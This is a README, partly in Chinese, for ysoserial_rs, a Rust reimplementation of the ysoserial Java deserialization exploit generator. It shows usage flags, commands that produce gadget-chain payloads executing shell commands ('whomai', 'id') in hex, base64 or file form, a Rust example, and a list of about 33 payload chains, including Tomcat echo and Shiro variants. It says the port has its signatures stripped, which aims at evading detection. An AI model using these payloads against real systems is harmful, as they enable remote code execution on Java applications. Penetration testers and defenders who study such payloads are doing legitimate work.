# ysoserial_rs

- ysoserial的rust实现
- 去特征，比原版体积小一半

## using

```shell
Usage: ysoserial [-p <payload>] [-c <command>] [--url <url>] [--echo-name <echo-name>] [--command-name <command-name>] [-o <output>] [-f <format>] [-l]

ysoserial_rs

Options:
  -p, --payload     select a payload
  -c, --command     command to execute
  --url             url to request dns
  --echo-name       tomcat echo request header name
  --command-name    tomcat command request header name
  -o, --output      save payload to file
  -f, --format      format to hex or base64
  -l, --list        list all payload
  --help            display usage information

```

### format

- hex

```shell
➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -f hex
aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f...
```

- base64

```shell
➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -f base64
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYm...
```

### output

```shell
➜  ysoserial_rs git:(main) ✗ ysoserial -p cc1 -c whomai -o cc1.ser
写入文件:cc1.ser,payload大小:1395
➜  ysoserial_rs git:(main) ✗ cat cc1.ser|xxd -ps
aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e
2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255ca
...
```

## examples

```shell
cargo run --example examples
```

- 详细请看examples目录

```rust
use std::fs::File;
use std::io;
use std::io::Write;
use ysoserial_rs::get_commons_beanutils1;

fn main() -> Result<(), io::Error> {
    let mut file = File::create("commons_beanutils1.ser")?;
    file.write_all(&get_commons_beanutils1("id"))?;
    Ok(())
}
```

## 支持列表

- [x] bs1
- [x] cc1
- [x] cc2
- [x] cc3
- [x] cc4
- [x] cc5
- [x] cc6
- [x] cc7
- [x] cck1
- [x] cck2
- [x] cck3
- [x] cck4
- [x] clojure
- [x] groovy1
- [x] hibernate1
- [x] hibernate2
- [x] javassist_weld1
- [x] jboss_interceptors1
- [x] jdk7u21
- [x] jdk8u20
- [x] json1
- [x] mozilla_rhino1
- [x] mozilla_rhino2
- [x] myfaces1
- [x] rome
- [x] spring1
- [x] spring2
- [x] cck1_tomcat_echo
- [x] cck2_tomcat_echo
- [x] url_dns
- [x] c3p0
- [x] vaadin1
- [x] shiro_spc
